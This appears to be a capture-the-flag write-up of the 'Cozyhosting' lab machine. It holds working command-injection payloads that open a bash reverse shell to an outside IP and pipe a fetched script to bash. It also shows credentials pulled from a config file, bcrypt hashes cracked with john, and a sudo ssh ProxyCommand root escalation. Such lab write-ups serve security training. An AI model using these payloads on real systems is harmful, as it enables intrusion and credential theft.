# easy - Cozyhosting

## User Flag

Nmap scanning:
```bash
~➤ sudo nmap -n -Pn -sV -O -T4 cozyhosting.htb
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

HTML source code:
- `/login`

The machine is called Cozy Hosting, so maybe we have subdomains for customers?


Errors:
When requesting: https://everything.curl.dev/http/requests/user-agent
```txt
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Mon Sep 04 14:36:03 UTC 2023
There was an unexpected error (type=Not Found, status=404).
```

Found additional endpoints
http://cozyhosting.htb/actuator
2023-09-04_10-55.png

User kanderson
```bash
~z➤ curl 'http://cozyhosting.htb/actuator/sessions'
{"BA622857926A06C4505AD2CD1B1E9A95":"kanderson","442EC4E952C2248C8DFD7A930CD183FB":"kanderson"}%
```

Request to /admin defaults a JSESSIONID:
```bash
~z➤ curl cozyhosting.htb/admin -I
HTTP/1.1 401
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 04 Sep 2023 15:00:12 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: JSESSIONID=4BC03143A386B60FE3D40BD9E3F52DF1; Path=/; HttpOnly
WWW-Authenticate: Basic realm="Realm"
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

Those are possible Cookies to be used. any of them worked
2023-09-04_10-57.png

Here the app tries to touch the .ssh/authorized_keys, I mean this HTTP endpoint runs a shell command:
2023-09-04_11-01.png


This worked forme:


Generate a base64 from the command "/bin/bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"
And send this on the post
;$(echo${IFS}<BASE64>${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/bash${IFS}) 


bash -i >& /dev/tcp/10.10.14.109/55555 0>&1
;$(echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDkvNTU1NTUgMD4mMQ==${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/bash${IFS}) 

Another payload:
&username=user|curl${IFS}<you ip>:80/<youshell>|bash|


.../content/infosec/htb➤ nc -lvnp 55555
Connection from 10.129.118.184:46450
bash: cannot set terminal process group (990): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@cozyhosting:/app$

What is running
```bash
app@cozyhosting:/tmp/t$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      990/java
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```


Some creds
```bash
app@cozyhosting:/tmp/t$ cat /tmp/t//BOOT-INF/classes/application.properties

cat ./BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
app@cozyhosting:/tmp/t$
```


app@cozyhosting:/app$ cat /etc/hosts
cat /etc/hosts
127.0.0.1 localhost cozyhosting cozyhosting.htb
127.0.1.1 cozycloud


```bash

app@cozyhosting:/app$ PGPASSWORD="Vg&nvzAQ7XxR" psql -h cozyhosting -U postgres -d cozyhosting -c 'SELECT * FROM pg_catalog.pg_tables;'

<ozyhosting -c 'SELECT * FROM pg_catalog.pg_tables;'
     schemaname     |        tablename        | tableowner | tablespace | hasindexes | hasrules | hastriggers | rowsecurity
--------------------+-------------------------+------------+------------+------------+----------+-------------+-------------
 public             | users                   | postgres   |            | t          | f        | t           | f
 public             | hosts                   | postgres   |            | t          | f        | t           | f
 pg_catalog         | pg_statistic            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_type                 | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_foreign_table        | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_authid               | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_statistic_ext_data   | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_user_mapping         | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_subscription         | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_attribute            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_proc                 | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_class                | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_attrdef              | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_constraint           | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_inherits             | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_index                | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_operator             | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_opfamily             | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_opclass              | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_am                   | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_amop                 | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_amproc               | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_language             | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_largeobject_metadata | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_aggregate            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_statistic_ext        | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_rewrite              | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_trigger              | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_event_trigger        | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_description          | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_cast                 | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_enum                 | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_namespace            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_conversion           | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_depend               | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_database             | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_db_role_setting      | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_tablespace           | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_auth_members         | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_shdepend             | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_shdescription        | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_ts_config            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_ts_config_map        | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_ts_dict              | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_ts_parser            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_ts_template          | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_extension            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_foreign_data_wrapper | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_foreign_server       | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_policy               | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_replication_origin   | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_default_acl          | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_init_privs           | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_seclabel             | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_shseclabel           | postgres   | pg_global  | t          | f        | f           | f
 pg_catalog         | pg_collation            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_partitioned_table    | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_range                | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_transform            | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_sequence             | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_publication          | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_publication_rel      | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_subscription_rel     | postgres   |            | t          | f        | f           | f
 pg_catalog         | pg_largeobject          | postgres   |            | t          | f        | f           | f
 information_schema | sql_parts               | postgres   |            | f          | f        | f           | f
 information_schema | sql_implementation_info | postgres   |            | f          | f        | f           | f
 information_schema | sql_features            | postgres   |            | f          | f        | f           | f
 information_schema | sql_sizing              | postgres   |            | f          | f        | f           | f
(68 rows)
```

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


```bash
app@cozyhosting:/app$ PGPASSWORD="Vg&nvzAQ7XxR" psql -h cozyhosting -U postgres -d cozyhosting -c 'select * from users;'

<U postgres -d cozyhosting -c 'select * from users;'
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```


```bash
.../c/infosec/htb➤ john -w=/usr/share/dict/rockyou.txt hashes.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (admin)
```

SSH
```bash
josh@cozyhosting.htb's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep  4 03:41:47 PM UTC 2023

  System load:           0.0
  Usage of /:            56.2% of 5.42GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             239
  Users logged in:       0
  IPv4 address for eth0: 10.129.118.184
  IPv6 address for eth0: dead:beef::250:56ff:fe96:f902


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$ ls
user.txt
```

## Root Flag

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Sorry, try again.
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

https://gtfobins.github.io/gtfobins/ssh/
```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/josh
```

## TODOs
